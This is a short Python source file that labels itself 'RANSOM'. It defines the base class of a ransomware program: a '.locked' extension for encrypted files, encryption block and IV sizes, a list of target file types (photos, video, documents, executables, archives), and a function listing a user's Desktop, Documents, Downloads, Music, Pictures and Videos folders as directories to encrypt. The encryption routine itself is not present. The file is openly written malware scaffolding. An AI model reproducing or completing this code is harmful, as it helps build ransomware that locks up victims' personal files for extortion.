## RANSOM
## Base class
## author mls

# Import libs
import os

# Import classes

################
## Base class ##
################
class Base():
    # Init base object

    # SCHEMA
    ENCRYPTED_EXTENSION = ".locked"
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912 # 536870912B = 536 MB

    # TODO Place base dirs in here. Create a function we can call to return them
    FILETYPES = [
                # GENERAL FORMATS

                # IMAGE FORMATS
                "jpg", "png",

                # VIDEO FORMATS
                "mp4", "avi", "mkv",

                # DOCUMENT FORMATS
                "doc", "docx", "txt",

                # SOUND FORMATS
                "mp3",

                # EXE FORMATS
                "exe", "msi", "php",

                # COMPRESSION FORMATS
                "tgz", "zip", "rar"
                ]

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

